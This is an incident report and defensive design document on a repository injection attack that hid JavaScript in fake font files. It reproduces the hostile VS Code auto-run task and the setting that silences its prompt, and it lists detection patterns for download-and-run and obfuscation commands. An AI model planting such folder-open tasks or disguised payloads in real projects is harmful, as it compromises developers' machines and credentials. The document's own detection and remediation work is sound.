# Payload Injection Incident and the Pull Guard

## 1. Purpose

This document records the September 2026 payload injection against the GridLab
repositories and defines the tooling that prevents the same payload from being
checked out again. It is written to survive a context loss: everything needed to
continue the work, verify a claim, or hand the incident to someone else is here,
including commit hashes, file paths, and the exact detection rules.

## 2. Scope

Applies to every repository under the `IsaacBell` account, with confirmed hits in
`gravity-grid-game` and `secure-devtools`. The detection tooling described in
sections 7 and 8 ships with `am-i-compromised`.

## 3. What happened

Timeline, newest first. Times are as recorded by GitHub and git.

1. **2026-09-16 13:15 +0200** — the remote `main` branch of
   `games/gravity-grid` (remote `IsaacBell/gravity-grid-game`) was rewritten. The
   commit after the rewrite is `1009468`, titled `refactoring`. Its author date is
   `2026-08-30 13:53 -0400`, its committer date is the September 16 timestamp. A
   three-week gap between author and committer date, with a different timezone
   offset, is the metadata signature of an attacker rebasing a commit onto a
   branch.
2. **2026-09-16** — the local clone was inspected. The rewritten commit added
   `.vscode/tasks.json`, `.vscode/settings.json`, `.env`, a `public/fonts/` tree
   of FontAwesome assets, and a heavily rewritten `src/main.ts`, and it added
   `dotenv` plus `node-fetch` to `package.json`.
3. **2026-09-14 01:56 -0400** — a GitHub audit log entry shows an OAuth access
   token created and regenerated for the `Copilot Chat App` GitHub App on the
   account, from `23.234.114.188` (Salt Lake City, United States). The token scopes
   field is empty in the export, which means the grant came from the GitHub App's
   permissions rather than user scopes.
4. **2026-09-17** — the same asset tree was found on `origin/feat/hipaa2` in
   `secure-devtools`, in commit `76e04fd` titled `create hipaa toolkit`, with the
   payload files under
   `apps/secure-semgrep/rules/ai/ai-best-practices/agent-unbounded-loop/public/fonts/`.
   The same fetch reported forced updates to `feat/hipaa` and
   `feat/staging-env-config`.

### 3.1 The delivery mechanism

`.vscode/tasks.json` in the injected commit contained one task:

```json
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./design/characters/expressions/v2/public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./design/characters/expressions/v2/public/fonts/fa-solid-400.woff2) || echo ''",
  "runOptions": { "runOn": "folderOpen" }
}
```

Two details make this effective. The task runs when the folder is opened, not
when anything is built or tested. And the file it executes is named like a web
font: `fa-solid-400.woff2` is a one-line text file containing JavaScript, while
every genuine font beside it is binary. A filename-based review passes it; only a
content check catches it.

`.vscode/settings.json` in the same commit sets `"task.allowAutomaticTasks": true`,
which suppresses the confirmation prompt that would otherwise appear before an
automatic task runs.

### 3.2 The payload's intent

The committed `package.json` gains `dotenv` and `node-fetch`. That pair is the
standard way to read a local `.env` file and POST its contents to a remote
endpoint, which is consistent with the injected `.env` and with credential
harvesting rather than with any game or tooling feature.

## 4. Impact

- **Execution requires opening the affected folder in VS Code** while the
  injected commit is checked out and automatic tasks are permitted. Nothing else
  triggers it: not cloning, not fetching, not a build, not a test run.
- **No payload file was ever checked out in the working trees inspected.** The
  `gravity-grid` working tree contains no `.vscode/` directory, no `.env`, and no
  `public/fonts/` tree. The `secure-devtools` local branch `feat/hipaa2` does not
  contain the payload commit at all.
- **Git objects from a fetch are inert.** A fetch writes compressed objects under
  `.git/objects`. They execute nothing. The risk begins at checkout, which is why
  the guard in section 7 operates between fetch and merge.
- **The account's push credentials were in the attacker's hands.** That is the
  part that matters for the future: detection shortens exposure, but only
  credential rotation ends it.

## 5. Indicators of compromise

Use these as the detection signature. Items 1 to 4 are checked by the scanner;
items 5 to 7 are checked by the pull guard.

1. **Editor auto-run configuration** — any `.vscode/*.json` (or `.idea/tasks.json`)
   containing `runOn`, or `allowAutomaticTasks` set to `true`.
2. **Download-and-run command in editor config** — an MCP `stdio` server whose
   command fetches and pipes into a shell (`curl … | sh`, `wget …`), or invokes
   `powershell`, `osascript`, or `base64 -d`.
3. **Payload hidden in an asset file** — JavaScript shapes (`require(`, `eval(`,
   `spawn(`, `_0x…`, `atob(`) inside an extension that should hold binary or
   opaque data: `woff`, `woff2`, `ttf`, `otf`, `eot`, `png`, `jpg`, `jpeg`, `gif`,
   `ico`, `svg`, `pdf`, `mp3`, `mp4`.
4. **Tracked `.env` file** — `.env` or `.env.*` present in the git index.
   Untracked local `.env` files are normal and must not be flagged.
5. **History rewrite** — the upstream tip is not a descendant of the local tip,
   meaning the branch was force-pushed. Confirm with
   `git merge-base --is-ancestor HEAD @{u}`.
6. **Commit metadata mismatch** — author email differs from committer email, or
   the committer date is far newer than the author date, or the committer timezone
   offset differs from the author's.
7. **Dependency pair** — `dotenv` and `node-fetch` (or `axios`) added in the same
   commit that touches editor configuration.

A file-name fingerprint also works well for this specific campaign: the payload
always arrives as a set of FontAwesome filenames whose `*.woff2` members are text
rather than binary.

## 6. Remediation status

Completed:

- `gravity-grid-game`: remote `main` force-pushed with the clean history, tip
  `fcb73de`. The injected object `1009468` was removed from the local object store;
  `git cat-file -e 1009468` now fails.
- `gravity-grid-game`: the six local commits were re-authored to the account's
  GitHub noreply address so the push would pass the account's email privacy rule.
  Content and messages are unchanged.
- `gravity-grid-game`: tag `v1.1.0` created on `fcb73de` and pushed. `v1.0.0`
  remains on `98ffed2`.
- `secure-devtools`: the scanner gained the three editor and asset indicators, a
  full attack-shape reproduction test, and negative tests. All 59 tests pass.
- `secure-devtools`: indicator definitions moved to `bin/ioc-patterns.sh`, shared
  by the scanner and the pull guard so the two cannot drift.
- `secure-devtools`: the scanner gained the tracked-`.env` check.
- `secure-devtools`: `bin/safe-pull.sh` implements the guard described in section
  7, with `test/safe-pull.bats` covering the clean merge, the payload refusal, the
  rewritten-upstream refusal, the identity mismatch, the committed `.env`, the
  dependency pair, `--dry-run`, and the dirty-tree precondition. 72 tests pass and
  `mise run check` is clean.
- `secure-devtools`: the CI trigger was widened from `main` to every branch.

Outstanding:

- The injected commit remains reachable on `origin/feat/hipaa2` in
  `secure-devtools` until it is force-pushed over. GitHub keeps unreachable
  commits fetchable by SHA until it garbage-collects; removing them entirely needs
  a support request.
- Credential rotation is in progress and is the only step that stops the attacker
  from re-pushing.
- Other repositories outside this workspace have not been checked.

**Callout — do not check out a suspect commit to inspect it.** Use the plumbing
described in section 7. Checking out is what turns an inert object into a file
that editor tooling can execute.

## 7. Design: the pull guard

`bin/safe-pull.sh` wraps `git pull` so that incoming commits are inspected before
they reach the working tree. The rule is that `git fetch` is safe and `git merge`
is not, so the guard sits between the two.

Sequence:

1. Refuse to run with a dirty working tree unless `--allow-dirty` is given.
2. `git fetch` the upstream.
3. Force-update check: if the upstream tip is not a descendant of `HEAD`, report
   a rewrite and stop. A rewritten upstream is itself an IOC and is never merged
   automatically.
4. Inspect the incoming tree with plumbing only, using the incoming ref:
   - `git diff --name-only HEAD..@{u}` for path rules (`.vscode/**`, `.env`,
     `*.woff2`, `package.json`).
   - `git grep -E <pattern> @{u}` for content rules. This searches the incoming
     blobs directly, so hidden directories are covered by construction and
     nothing is written to disk.
   - `git log --format=… HEAD..@{u}` for the metadata mismatch rule.
5. Print findings and exit non-zero. Nothing is merged.
6. Only when every check is clean, `git merge --ff-only @{u}`.

Flags: `--allow-dirty`, `--force-update` (merge despite a rewritten upstream,
after a human has reviewed the diff), `--dry-run` (check only, never merge),
`--remote`/`--branch` to select the upstream.

The patterns live in `bin/ioc-patterns.sh`, sourced by both `scanner.sh` and
`safe-pull.sh`, so a rule added for one is enforced by the other.

## 8. CI changes

The security-gate job previously ran only on pushes to `main` and on pull
requests, which is why the `secure-devtools` payload was never scanned even though
a gate existed. The trigger is widened to all branches. The scanner fixes are
what make the gate effective on this payload class: ripgrep skips dot-directories
unless told otherwise, and asset extensions were not in the scanned glob set, so
both halves of the attack were invisible to the old gate.

Note that CI cannot prevent a commit from landing. It blocks the merge to `main`
and it shortens the window; branch protection and required status checks are what
give the gate authority.

## 9. Verification

Tests live in `apps/am-i-compromised/test/`:

- `scanner.bats` covers each indicator plus negative cases (benign `tasks.json`,
  opaque `.woff2`, remote HTTP MCP server, `uvx` and `pnpm dlx` MCP servers) and a
  full attack-shape reproduction.
- `safe-pull.bats` builds throwaway repositories: one whose incoming commit adds
  the payload (the guard must refuse and must not merge), one with a plain code
  change (the guard must proceed), and one with a rewritten upstream history (the
  guard must stop without `--force-update`).

Run the whole gate with:

```sh
cd apps/secure-devtools && mise run check   # shellcheck + shfmt + bats
mise run gate                                # scan the repository itself
```

## 10. Open items

- Decide whether the pull guard is installed as a git alias
  (`git config alias.safe-pull '!bash …/safe-pull.sh'`) or as a `pre-merge-commit`
  hook, or both.
- Decide whether `dotenv` + `node-fetch` in one commit should be a scanner finding
  or stay a pull-guard-only rule. It is deliberately not in the scanner yet,
  because both packages are legitimate on their own and the pair is common in
  ordinary projects.
- Confirm whether `reports/` and `templates/` in `secure-devtools` should stay
  ignored or be tracked deliberately.
